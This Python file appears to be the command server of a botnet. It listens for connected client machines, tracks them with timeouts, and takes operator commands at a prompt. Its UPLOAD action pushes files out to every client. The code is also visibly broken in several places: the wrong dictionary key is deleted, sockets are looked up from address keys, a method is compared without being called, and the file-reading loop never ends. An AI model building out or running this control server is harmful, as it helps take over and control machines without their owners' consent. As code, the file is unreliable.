import socket
import os, sys
import _thread
import queue
import time

from h11 import ConnectionClosed
from Downloader import Download

from botnet import ALL_ACTIONS

CLIENT_TIMEOUT =  30 # seconds
MAXIMUM_CLIENTS = 100 # seconds
SEND_FILE_BUFFER = 5120 # 5kb

# Common parts
cwd = os.getcwd()
os.chdir('..')
sys.path.append(os.getcwd())
os.chdir(cwd)

from Communicator import COMMUNICATOR

class SERVER:
    def __init__(self, ip, port):
        self.clients = {}
        self.ACTIONS = {
            'UPLOAD': SendFile,
        }

        sock = socket.socket()
        sock.bind((ip, port))

        global MAXIMUM_CLIENTS
        sock.listen(MAXIMUM_CLIENTS)

        self.sock = COMMUNICATOR(sock)
        self.DataToSend = queue.Queue()

    # Add a client to the list
    def UpdateClient(self, addr, conn):
            self.clients[addr] = (conn, time.time()) # Insert/Update client socket/time

    # Remove clients if passed the timeout
    def ClientTimeouts(self):
        todelete = []
        for k,v in self.clients.items():
            if time.time() - v[1] > CLIENT_TIMEOUT:
                todelete.append(k)

        for i in todelete:
            del self.clients[k]

    def ConnectClients(self):
        pass

    def AcceptClients(self):
        while True:
            client = self.sock.accept() # Non-blocking accept
            if client:
                self.UpdateClient(client[1], client[0])
            else:
                break

    def SendToClients(self, data):
        for i in self.clients:
            sock = i[0]
            sock.send(data)

    def MainLoop(self, in_, out_):
        EnableInput = True
        while True:
            self.AcceptClients()
            self.ClientTimeouts()
            if out_.qsize == 0:
                out_.put(self.clients)
            
            try:
                data = self.DataToSend.get(False) # Non-Blocking
            except:
                EnableInput = True
            else:
                EnableInput = False
                self.SendToClients(data)


            if EnableInput:
                try:
                    i = in_.get(False) # Non-Blocking
                    print(data)
                except:
                    pass
                else:
                    li = i.split(' ')[0]
                    if li in self.ACTIONS:
                        self.ACTIONS[li](i, self.DataToSend)
            

    ####### ACTIONS #######

    # This allows us to send files
def _SendFile(path, sendQ):
    path = path.replace('\\', '/') # make sure path is in linux form
    name = path.split('/')[-1] # get the name
    size = os.path.getsize(path)
    print('SENDING DOWNLOAD EVENT')
    #               0       1       2
    sendQ.put(f'DOWNLOAD "{name}" {size}\n') # \n is for detecting when the header stop
    print('SENT')

    f = open(path, 'r')
    while f:
        data = f.read(SEND_FILE_BUFFER)
        sendQ.put(data)
    f.close()

# Laucher to send files
def SendFile(inp, q):
    inp = inp.split(' ')
    if len(inp) > 1:
        path = ' '.join(inp[1:])
    else:
        return 1
    _thread.start_new_thread(_SendFile(path, q))
    return 0


if __name__ == "__main__":
    s = SERVER('127.0.0.1', 8080)
    in_ = queue.Queue()
    out_ = queue.Queue()
    _thread.start_new_thread(s.MainLoop, (in_, out_))

    while True:
        os.system('cls')
        i = input('> ')
        if i:
            in_.put(i)